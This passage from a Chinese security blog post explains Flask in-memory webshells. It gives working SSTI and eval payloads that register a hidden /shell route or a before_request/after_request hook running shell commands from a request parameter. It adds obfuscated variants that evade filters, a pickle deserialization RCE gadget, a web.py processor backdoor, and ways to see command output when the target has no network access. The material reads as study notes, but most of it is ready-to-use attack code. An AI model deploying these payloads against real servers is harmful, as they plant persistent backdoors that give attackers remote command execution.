<pre><code class="hljs scss"><span class="hljs-selector-attr">[<span class="hljs-string">'ArithmeticError'</span>, <span class="hljs-string">'AssertionError'</span>, <span class="hljs-string">'AttributeError'</span>, <span class="hljs-string">'BaseException'</span>, <span class="hljs-string">'BlockingIOError'</span>, <span class="hljs-string">'BrokenPipeError'</span>, <span class="hljs-string">'BufferError'</span>, <span class="hljs-string">'BytesWarning'</span>, <span class="hljs-string">'ChildProcessError'</span>, <span class="hljs-string">'ConnectionAbortedError'</span>, <span class="hljs-string">'ConnectionError'</span>, <span class="hljs-string">'ConnectionRefusedError'</span>, <span class="hljs-string">'ConnectionResetError'</span>, <span class="hljs-string">'DeprecationWarning'</span>, <span class="hljs-string">'EOFError'</span>, <span class="hljs-string">'Ellipsis'</span>, <span class="hljs-string">'EncodingWarning'</span>, <span class="hljs-string">'EnvironmentError'</span>, <span class="hljs-string">'Exception'</span>, <span class="hljs-string">'False'</span>, <span class="hljs-string">'FileExistsError'</span>, <span class="hljs-string">'FileNotFoundError'</span>, <span class="hljs-string">'FloatingPointError'</span>, <span class="hljs-string">'FutureWarning'</span>, <span class="hljs-string">'GeneratorExit'</span>, <span class="hljs-string">'IOError'</span>, <span class="hljs-string">'ImportError'</span>, <span class="hljs-string">'ImportWarning'</span>, <span class="hljs-string">'IndentationError'</span>, <span class="hljs-string">'IndexError'</span>, <span class="hljs-string">'InterruptedError'</span>, <span class="hljs-string">'IsADirectoryError'</span>, <span class="hljs-string">'KeyError'</span>, <span class="hljs-string">'KeyboardInterrupt'</span>, <span class="hljs-string">'LookupError'</span>, <span class="hljs-string">'MemoryError'</span>, <span class="hljs-string">'ModuleNotFoundError'</span>, <span class="hljs-string">'NameError'</span>, <span class="hljs-string">'None'</span>, <span class="hljs-string">'NotADirectoryError'</span>, <span class="hljs-string">'NotImplemented'</span>, <span class="hljs-string">'NotImplementedError'</span>, <span class="hljs-string">'OSError'</span>, <span class="hljs-string">'OverflowError'</span>, <span class="hljs-string">'PendingDeprecationWarning'</span>, <span class="hljs-string">'PermissionError'</span>, <span class="hljs-string">'ProcessLookupError'</span>, <span class="hljs-string">'RecursionError'</span>, <span class="hljs-string">'ReferenceError'</span>, <span class="hljs-string">'ResourceWarning'</span>, <span class="hljs-string">'RuntimeError'</span>, <span class="hljs-string">'RuntimeWarning'</span>, <span class="hljs-string">'StopAsyncIteration'</span>, <span class="hljs-string">'StopIteration'</span>, <span class="hljs-string">'SyntaxError'</span>, <span class="hljs-string">'SyntaxWarning'</span>, <span class="hljs-string">'SystemError'</span>, <span class="hljs-string">'SystemExit'</span>, <span class="hljs-string">'TabError'</span>, <span class="hljs-string">'TimeoutError'</span>, <span class="hljs-string">'True'</span>, <span class="hljs-string">'TypeError'</span>, <span class="hljs-string">'UnboundLocalError'</span>, <span class="hljs-string">'UnicodeDecodeError'</span>, <span class="hljs-string">'UnicodeEncodeError'</span>, <span class="hljs-string">'UnicodeError'</span>, <span class="hljs-string">'UnicodeTranslateError'</span>, <span class="hljs-string">'UnicodeWarning'</span>, <span class="hljs-string">'UserWarning'</span>, <span class="hljs-string">'ValueError'</span>, <span class="hljs-string">'Warning'</span>, <span class="hljs-string">'WindowsError'</span>, <span class="hljs-string">'ZeroDivisionError'</span>, <span class="hljs-string">'_'</span>, <span class="hljs-string">'__build_class__'</span>, <span class="hljs-string">'__debug__'</span>, <span class="hljs-string">'__doc__'</span>, <span class="hljs-string">'__import__'</span>, <span class="hljs-string">'__loader__'</span>, <span class="hljs-string">'__name__'</span>, <span class="hljs-string">'__package__'</span>, <span class="hljs-string">'__spec__'</span>, <span class="hljs-string">'abs'</span>, <span class="hljs-string">'aiter'</span>, <span class="hljs-string">'all'</span>, <span class="hljs-string">'anext'</span>, <span class="hljs-string">'any'</span>, <span class="hljs-string">'ascii'</span>, <span class="hljs-string">'bin'</span>, <span class="hljs-string">'bool'</span>, <span class="hljs-string">'breakpoint'</span>, <span class="hljs-string">'bytearray'</span>, <span class="hljs-string">'bytes'</span>, <span class="hljs-string">'callable'</span>, <span class="hljs-string">'chr'</span>, <span class="hljs-string">'classmethod'</span>, <span class="hljs-string">'compile'</span>, <span class="hljs-string">'complex'</span>, <span class="hljs-string">'copyright'</span>, <span class="hljs-string">'credits'</span>, <span class="hljs-string">'delattr'</span>, <span class="hljs-string">'dict'</span>, <span class="hljs-string">'dir'</span>, <span class="hljs-string">'divmod'</span>, <span class="hljs-string">'enumerate'</span>, <span class="hljs-string">'eval'</span>, <span class="hljs-string">'exec'</span>, <span class="hljs-string">'exit'</span>, <span class="hljs-string">'filter'</span>, <span class="hljs-string">'float'</span>, <span class="hljs-string">'format'</span>, <span class="hljs-string">'frozenset'</span>, <span class="hljs-string">'getattr'</span>, <span class="hljs-string">'globals'</span>, <span class="hljs-string">'hasattr'</span>, <span class="hljs-string">'hash'</span>, <span class="hljs-string">'help'</span>, <span class="hljs-string">'hex'</span>, <span class="hljs-string">'id'</span>, <span class="hljs-string">'input'</span>, <span class="hljs-string">'int'</span>, <span class="hljs-string">'isinstance'</span>, <span class="hljs-string">'issubclass'</span>, <span class="hljs-string">'iter'</span>, <span class="hljs-string">'len'</span>, <span class="hljs-string">'license'</span>, <span class="hljs-string">'list'</span>, <span class="hljs-string">'locals'</span>, <span class="hljs-string">'map'</span>, <span class="hljs-string">'max'</span>, <span class="hljs-string">'memoryview'</span>, <span class="hljs-string">'min'</span>, <span class="hljs-string">'next'</span>, <span class="hljs-string">'object'</span>, <span class="hljs-string">'oct'</span>, <span class="hljs-string">'open'</span>, <span class="hljs-string">'ord'</span>, <span class="hljs-string">'pow'</span>, <span class="hljs-string">'print'</span>, <span class="hljs-string">'property'</span>, <span class="hljs-string">'quit'</span>, <span class="hljs-string">'range'</span>, <span class="hljs-string">'repr'</span>, <span class="hljs-string">'reversed'</span>, <span class="hljs-string">'round'</span>, <span class="hljs-string">'set'</span>, <span class="hljs-string">'setattr'</span>, <span class="hljs-string">'slice'</span>, <span class="hljs-string">'sorted'</span>, <span class="hljs-string">'staticmethod'</span>, <span class="hljs-string">'str'</span>, <span class="hljs-string">'sum'</span>, <span class="hljs-string">'super'</span>, <span class="hljs-string">'tuple'</span>, <span class="hljs-string">'type'</span>, <span class="hljs-string">'vars'</span>, <span class="hljs-string">'zip'</span>]</span></code></pre>
<p>因此我们就用利用这个内建函数来调用其中的命令执行函数</p>
<p>接着再来看<code>app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())</code></p>
<p>至于这个lambda匿名函数可以参考菜鸟教程：<a target="_blank" rel="noopener" href="https://www.runoob.com/python/python-functions.html">https://www.runoob.com/python/python-functions.html</a></p>
<p>这段代码就是先动态创建一条路由，该路由处理的函数名为shell，然后具体函数内容就是lambda表达式，表达式中，调用os模块的popen函数，其中利用_request_ctx_stack.top来获取到请求的上下文，然后获取请求上下文的request，然后再得到请求的cmd的get传参，然后执行。</p>
<p>再来看<code>'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']}</code></p>
<p><code>_request_ctx_stack</code>是<code>Flask</code>的一个全局变量, 是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>。<code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528142205320.png" alt="image-20240528142205320"></p>
<p>总的来说就是通过获取app对象，使用app对象中的add_url_rule方法添加能够RCE的后门路由达到内存马的效果</p>
<h1 id="0x05-bypass">0x05 ByPass</h1>
<h2 id="常规字符过滤的绕过">常规字符过滤的绕过</h2>
<p>这里就直接按参考文章了</p>
<ul>
<li><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code>.</li>
<li>代码执行函数替换, 如<code>exec</code>等替换<code>eval</code>。</li>
<li>字符串可采用拼接方式, 如<code>['__builtins__']['eval']</code>变为<code>['__bui'+'ltins__']['ev'+'al']</code>.</li>
<li><code>__globals__</code>可用<code>__getattribute__('__globa'+'ls__')</code>替换.</li>
<li><code>[]</code>可用<code>.__getitem__()</code>或<code>.pop()</code>替换.</li>
<li>过滤<code>{{`或者`}}</code>, 可以使用<code>{%`或者`%}</code>绕过, <code>{%%}</code>中间可以执行<code>if</code>语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.</li>
<li>过滤<code>_</code>可以用编码绕过, 如<code>__class__</code>替换成<code>\x5f\x5fclass\x5f\x5f</code>, 还可以用<code>dir(0)[0][0]</code>或者<code>request['args']</code>或者<code>request['values']</code>绕过.</li>
<li>过滤了<code>.</code>可以采用<code>attr()</code>或<code>[]</code>绕过.</li>
<li>其它的手法参考<code>SSTI</code>绕过过滤的方法即可…</li>
</ul>
<p>变形payload：</p>
<ul>
<li>原<code>Payload</code></li>
</ul>
<pre><code class="hljs scss">url_for<span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">'eval'</span>]</span>("app.add_url_rule('/shell', 'shell', lambda :__import__('os')<span class="hljs-selector-class">.popen</span>(_request_ctx_stack.top.request.args.get('shell'))<span class="hljs-selector-class">.read</span>())",{'_request_ctx_stack':url_for.__globals__[<span class="hljs-string">'_request_ctx_stack'</span>],<span class="hljs-string">'app'</span>:url_for.__globals__[<span class="hljs-string">'current_app'</span>]})</code></pre>
<ul>
<li>变形<code>Payload-1</code></li>
</ul>
<pre><code class="hljs scss">request<span class="hljs-selector-class">.application</span><span class="hljs-selector-class">.__self__</span><span class="hljs-selector-class">._get_data_for_json</span><span class="hljs-selector-class">.__getattribute__</span>('__globa'+'ls__')<span class="hljs-selector-class">.__getitem__</span>('__bui'+'ltins__')<span class="hljs-selector-class">.__getitem__</span>('ex'+'ec')("app.add_url_rule('/shell', 'shell', lambda :__import__('os')<span class="hljs-selector-class">.popen</span>(_request_ctx_stack.top.request.args.get('shell', 'calc'))<span class="hljs-selector-class">.read</span>())",{'_request_ct'+'x_stack':get_flashed_messages.<span class="hljs-built_in">__getattribute__</span>(<span class="hljs-string">'__globa'</span>+<span class="hljs-string">'ls__'</span>).<span class="hljs-built_in">pop</span>(<span class="hljs-string">'_request_'</span>+<span class="hljs-string">'ctx_stack'</span>),<span class="hljs-string">'app'</span>:get_flashed_messages.<span class="hljs-built_in">__getattribute__</span>(<span class="hljs-string">'__globa'</span>+<span class="hljs-string">'ls__'</span>).<span class="hljs-built_in">pop</span>(<span class="hljs-string">'curre'</span>+<span class="hljs-string">'nt_app'</span>)})</code></pre>
<ul>
<li>变形<code>Payload-2</code></li>
</ul>
<pre><code class="hljs scss">get_flashed_messages|<span class="hljs-built_in">attr</span>("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fglobals\x5f\x5f")|<span class="hljs-built_in">attr</span>("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fgetitem\x5f\x5f")("__builtins__")|<span class="hljs-built_in">attr</span>("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fgetitem\x5f\x5f")("\u0065\u0076\u0061\u006c")("app.add_ur"+"l_rule('/shell', 'shell', la"+"mbda :__imp"+"ort__('o"+"s')<span class="hljs-selector-class">.po</span>"+"<span class="hljs-built_in">pen</span>(_request_c"+"tx_stack.to"+"p.re"+"quest.args.get('shell'))<span class="hljs-selector-class">.re</span>"+"<span class="hljs-built_in">ad</span>())",{'\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b':get_flashed_messages|<span class="hljs-built_in">attr</span>(<span class="hljs-string">"\x5f\x5fgetattribute\x5f\x5f"</span>)(<span class="hljs-string">"\x5f\x5fglobals\x5f\x5f"</span>)|<span class="hljs-built_in">attr</span>(<span class="hljs-string">"\x5f\x5fgetattribute\x5f\x5f"</span>)(<span class="hljs-string">"\x5f\x5fgetitem\x5f\x5f"</span>)(<span class="hljs-string">"\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b"</span>),<span class="hljs-string">'app'</span>:get_flashed_messages|<span class="hljs-built_in">attr</span>(<span class="hljs-string">"\x5f\x5fgetattribute\x5f\x5f"</span>)(<span class="hljs-string">"\x5f\x5fglobals\x5f\x5f"</span>)|<span class="hljs-built_in">attr</span>(<span class="hljs-string">"\x5f\x5fgetattribute\x5f\x5f"</span>)(<span class="hljs-string">"\x5f\x5fgetitem\x5f\x5f"</span>)(<span class="hljs-string">"\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070"</span>)})</code></pre>
<h2 id="不出网或无回显">不出网或无回显</h2>
<h3 id="常规思路">常规思路</h3>
<p>Flask的内存马适用于pickle反序列化、SSTI等能够达成代码执行。</p>
<p>首先从sys.modules中获取app对象（sys.modules是一个全局字典，该字典是python启动后就加载在内存中）</p>
<pre><code class="hljs scss">getApp = sys<span class="hljs-selector-class">.modules</span><span class="hljs-selector-attr">[<span class="hljs-string">'__main__'</span>]</span><span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-attr">[<span class="hljs-string">'app'</span>]</span></code></pre>
<p>获取APP对象后就能操作当前Flask APP的配置了，在无回显、不出网的前提下，为了获取RCE回显，此时有四条路可选</p>
<ol>
<li>打开Flask的Debug模式，抛出Exception来回显</li>
</ol>
<pre><code class="hljs scss">import sys
sys<span class="hljs-selector-class">.modules</span><span class="hljs-selector-attr">[<span class="hljs-string">'__main__'</span>]</span><span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-attr">[<span class="hljs-string">'app'</span>]</span><span class="hljs-selector-class">.debug</span>=True</code></pre>
<p>例如pickle反序列化代码执行的情况下使用异常信息来回显</p>
<pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">genpoc</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        s = <span class="hljs-string">"raise Exception(__import__('os').popen('ls /').read())"</span>  <span class="hljs-comment"># 要执行的命令</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">exec</span>, (s,)        <span class="hljs-comment"># reduce函数必须返回元组或字符串</span></code></pre>
<ol start="2">
<li>关闭Flask的Debug模式，实现一个内存马（通过add_url_rule方法）</li>
</ol>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> sys
sys.modules[<span class="hljs-string">'__main__'</span>].__dict__[<span class="hljs-string">'app'</span>].debug=<span class="hljs-literal">False</span>
sys.modules[<span class="hljs-string">'__main__'</span>].__dict__[<span class="hljs-string">'app'</span>].add_url_rule(<span class="hljs-string">'/shell'</span>,<span class="hljs-string">'shell'</span>,<span class="hljs-keyword">lambda</span> :<span class="hljs-built_in">__import__</span>(<span class="hljs-string">'os'</span>).popen(<span class="hljs-string">'ls /'</span>).read())</code></pre>
<ol start="3">
<li>设置Flask的静态文件目录为/tmp，通过&gt;写命令执行结果</li>
</ol>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> sys
sys.modules[<span class="hljs-string">'__main__'</span>].__dict__[<span class="hljs-string">'app'</span>].static_url_path=<span class="hljs-string">'/static'</span>
sys.modules[<span class="hljs-string">'__main__'</span>].__dict__[<span class="hljs-string">'app'</span>].static_folder=<span class="hljs-string">'/tmp/'</span>
<span class="hljs-built_in">__import__</span>(<span class="hljs-string">'os'</span>).popen(<span class="hljs-string">'ls / &gt; /tmp/test'</span>).read()</code></pre>
<ol start="4">
<li>时间盲注，命令执行配合sleep逐字符判断，例如如下命令</li>
</ol>
<p>假设flag是abcd，如果第一个字符为a则会执行sleep 3延时三秒，否则不执行sleep 3</p>
<pre><code class="hljs scss">echo 'abcd' | cut -<span class="hljs-selector-tag">b</span> <span class="hljs-number">1</span> | grep <span class="hljs-selector-tag">a</span> &amp;&amp; sleep <span class="hljs-number">3</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528143641328.png" alt="image-20240528143641328"></p>
<h3 id="webpy内存马">web.py内存马</h3>
<p>这个暂时不理解</p>
<p>web.py中可以通过add_processor方法实现一个拦截器，调用handler()即为获取拦截前的路由的结果</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_processor</span>(<span class="hljs-params">handler</span>):
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"before handling"</span>)
  result = handler()
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"after handling"</span>)
  <span class="hljs-keyword">return</span> result

app.add_processor(my_processor)</code></pre>
<p>当后端为web.py时的内存马实现方法如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">handler</span>): 
        <span class="hljs-keyword">import</span> subprocess
        params = web.<span class="hljs-built_in">input</span>()
        cmd = params.cmd
        output = subprocess.check_output(cmd, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">'utf-8'</span>)
        <span class="hljs-keyword">return</span> output
app = sys.modules[<span class="hljs-string">'__main__'</span>].__dict__[<span class="hljs-string">'app'</span>]
app.add_processor(hello)</code></pre>
<h2 id="add_url_rule无用">add_url_rule无用</h2>
<p>据文章所示，当下的flask版本已经不支持再运行程序的时候通过add_url_rule添加路由了，这里文章介绍了另一个方法来添加：使用@app.before_request装饰器</p>
<h3 id="before_request">before_request</h3>
<p>在 Flask 中，<code>before_request</code> 是一个装饰器，它用于在请求处理之前执行特定的函数。这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等。</p>
<p>定位到函数中，我们可以看到</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528144436595.png" alt="image-20240528144436595"></p>
<p>通过底层源码可以看到<code>before_request</code>实际上调用的是<code>self.before_request_funcs.setdefault(None, []).append(f)</code>，其意思是：</p>
<ul>
<li>检查 <code>self.before_request_funcs</code> 字典中是否有一个键为 <code>None</code> 的条目。</li>
<li>如果没有 <code>None</code> 键，就在字典中创建它，并将其值设置为一个空列表。</li>
<li>然后，无论 <code>None</code> 键是否存在，都将函数 <code>f</code> 添加到这个列表中。</li>
</ul>
<p>那意味着我们用过这个f，就能写入我们想要的函数了</p>
<p>当访问<code>http://127.0.0.1:5000/e?cmd=app.before_request_funcs.setdefault(None, []).append(lambda: "123")</code>后，后续所有的访问结果都将变成123，下面是那位师傅的截图，我没复现成功</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528144808586.png" alt="image-20240528144808586"></p>
<p>可见通过<code>before_request</code>添加内存马这一条路是可行的，但同样会有一点问题，就是使用lambda必然会得到一个返回值，那么服务后续的操作都无法进行，会影响到主机的正常业务。</p>
<h3 id="after_request">after_request</h3>
<p>针对这个问题，我们可以使用<code>@app.after_request</code>来解决，与<code>@app.before_request</code>类似，<code>after_request</code>会在请求结束得到响应包之后进行操作，查看底层源码可以看到其调用方法和<code>before_request</code>类似</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528144846381.png" alt="image-20240528144846381"></p>
<p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>传入的f就是对应的自定义函数，但这里的f需要接收一个response对象，同时返回一个response对象。</p>
<p>但我们仅通过lambad无法对原始传进来的response进行修改后再返回，所以需要重新生成一个response对象，然后再返回这个response。</p>
<p>访问对应的url为<code>http://127.0.0.1:5000/e?cmd=app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec('global CmdResp;CmdResp=make_response(os.popen(request.args.get(\'cmd\')).read())')==None else resp)</code></p>
<p>函数的内容为：</p>
<pre><code class="hljs scss">lambda resp: #传入参数
    CmdResp if request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">'cmd'</span>) and      #如果请求参数含有cmd则返回命令执行结果
    <span class="hljs-built_in">exec</span>(<span class="hljs-string">'</span>
<span class="hljs-string">        global CmdResp;     #定义一个全局变量，方便获取</span>
<span class="hljs-string">        CmdResp=make_response(os.popen(request.args.get(\'cmd\')).read())   #创建一个响应对象</span>
<span class="hljs-string">    '</span>)==None    #恒真
    else resp)  #如果请求参数没有cmd则正常返回
#这里的cmd参数名和CmdResp变量名都是可以改的，最好改成服务中不存在的变量名以免影响正常业务</code></pre>
<h1 id="0x06-参考文章">0x06 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://cizixs.com/2017/01/13/flask-insight-context/">flask 源码解析：上下文</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/121005608">[Python]Flask内存马学习</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10933?time__1311=mq%2BxB70QD%3D9xlxGgrDyiDceNmY0KNDO4PD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">Python 内存马分析</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.lxscloud.top/2022/10/09/CTF%E4%B8%ADPython_Flask%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">CTF中Python_Flask应用的一些解题方法总结</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14421?time__1311=mqmx9QD%3D0%3Di%3DLx05DIYYIpcD02mQFT%3DKe4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">Python Flask内存马的另辟途径</a></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/05/29/bluecms-dai-ma-shen-ji/">BlueCMS代码审计</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/05/21/ciscn-2024wp/">CISCN-2024Wp</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%8E%9F%E7%90%86"><span class="toc-text">0x02 原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">0x03 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flask%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6"><span class="toc-text">Flask上下文管理机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#add_url_rule"><span class="toc-text">add_url_rule</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-poc%E5%88%86%E6%9E%90"><span class="toc-text">0x04 POC分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-bypass"><span class="toc-text">0x05 ByPass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-text">常规字符过滤的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E6%88%96%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">不出网或无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%80%9D%E8%B7%AF"><span class="toc-text">常规思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webpy%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">web.py内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#add_url_rule%E6%97%A0%E7%94%A8"><span class="toc-text">add_url_rule无用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#before_request"><span class="toc-text">before_request</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#after_request"><span class="toc-text">after_request</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x06 参考文章</span></a></li></ol></div><div class="widget-footer">

